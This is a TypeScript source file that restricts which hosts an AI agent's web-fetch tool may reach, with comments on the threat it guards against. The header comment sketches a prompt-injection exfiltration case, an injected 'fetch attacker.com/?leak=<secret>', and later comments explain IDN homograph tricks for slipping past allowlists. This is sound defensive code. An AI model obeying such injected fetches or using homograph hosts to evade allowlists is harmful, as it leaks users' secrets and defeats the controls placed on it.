// Per-host allowlist for outbound web fetches. With the agent reading
// untrusted content (email, web pages), an open WebFetch is an exfiltration
// channel — the attacker doesn't need shell, they just inject "fetch
// attacker.com/?leak=<secret>". The fix is to bound where WebFetch can go.
//
// Matching rules (intentionally simple — easier to audit than to outsmart):
//   • Exact host:   "wikipedia.org"            ⇢ matches host === "wikipedia.org"
//   • Wildcard:     "*.wikipedia.org"          ⇢ matches any sub-domain
//   • Bare prefix:  "wikipedia.org"            ⇢ also matches subdomains (en.wikipedia.org)
//
// We accept either bare or wildcard form so the config file is forgiving;
// the matcher always honours the subdomain rule (a domain entry covers its
// subdomains, never its parent).
//
// Out of scope on purpose:
//   • Path-level allowlisting — query strings are how exfil is encoded, but a
//     host gate already kills the "attacker.com" route. Per-path rules add
//     complexity without buying much against the same threat.
//   • Punycode / IDN normalisation — Node's URL parser already lowercases and
//     decodes; we rely on that.

const NULL_HOSTS = new Set(['', 'localhost', '127.0.0.1', '::1']);

// Defence against IDN homograph attacks: Cyrillic `а` and Latin `a` look
// identical in the rendered URL but compare different. An attacker who can
// influence the URL the agent fetches can route a request to `wikipediа.org`
// (Cyrillic) past an allow-list entry typed as `wikipedia.org` (Latin).
//
// Node's WHATWG URL parser keeps non-ASCII hostnames in Punycode form (`xn--`)
// when given Unicode input, so we can detect both shapes here:
//   * Pure ASCII letters/digits/dot/hyphen → safe to compare.
//   * Anything Punycode-encoded (contains `xn--`) → rejected.
//   * Anything containing characters outside [a-z0-9.-] post-lowercase →
//     rejected. The allow-list itself is validated similarly, so a config
//     entry typed in any non-ASCII form can never match anything either.
const ASCII_HOST_RE = /^[a-z0-9.-]+$/;
function isAsciiHost(host: string): boolean {
  if (!ASCII_HOST_RE.test(host)) return false;
  // Reject Punycode-encoded labels even though they're ASCII-on-the-wire — an
  // operator typing `wikipedia.org` doesn't expect `xn--wikipedi-...` to slip
  // through, so require explicit, conscious entries (e.g. for legitimate IDN
  // sites, the operator types the actual `xn--` form).
  for (const label of host.split('.')) {
    if (label.startsWith('xn--')) return false;
  }
  return true;
}

/** Parse a URL string and return its lowercased hostname, or null on failure. */
export function urlHost(url: string): string | null {
  try {
    const u = new URL(url);
    if (u.protocol !== 'http:' && u.protocol !== 'https:') return null;
    // Node returns IPv6 hosts bracketed ("[::1]"). Strip for the loopback
    // check; everything else compares lowercase-normalised.
    const host = u.hostname.toLowerCase().replace(/^\[|\]$/g, '');
    if (NULL_HOSTS.has(host)) return null; // never trust loopback as "approved"
    if (!isAsciiHost(host)) return null; // rejects IDN / homograph / Punycode
    return host;
  } catch {
    return null;
  }
}

function entryMatches(host: string, entry: string): boolean {
  const e = entry.trim().toLowerCase();
  if (!e) return false;
  // Reject non-ASCII allow-list entries the same way urlHost rejects non-ASCII
  // hosts — an entry that can never match anything safely is dead config and
  // a noisy footgun if someone copies a Unicode-looking domain in. The `*.`
  // prefix is the only allowed non-[a-z0-9.-] character.
  const bare = e.startsWith('*.') ? e.slice(2) : e;
  if (!isAsciiHost(bare)) return false;
  if (e.startsWith('*.')) {
    return host === bare || host.endsWith('.' + bare);
  }
  // Bare entry: exact match, or host ends with ".<entry>" (subdomain).
  return host === e || host.endsWith('.' + e);
}

/** True if the URL's host matches any entry in the allowlist. */
export function urlAllowed(url: string, allowlist: string[]): boolean {
  const host = urlHost(url);
  if (host === null) return false;
  return allowlist.some((entry) => entryMatches(host, entry));
}
